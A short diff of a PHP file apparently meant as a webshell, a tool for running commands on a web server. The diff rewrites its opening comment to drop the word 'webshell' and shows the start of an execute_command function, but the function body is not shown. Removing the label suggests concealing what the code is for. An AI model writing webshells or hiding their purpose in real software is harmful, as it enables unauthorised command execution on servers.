@@ -1,5 +1,5 @@
 <?php
-// Create an interactive and user-friendly PHP webshell
+// interactive and user-friendly 
 
 // Define a custom function to execute commands
 function execute_command($cmd) {
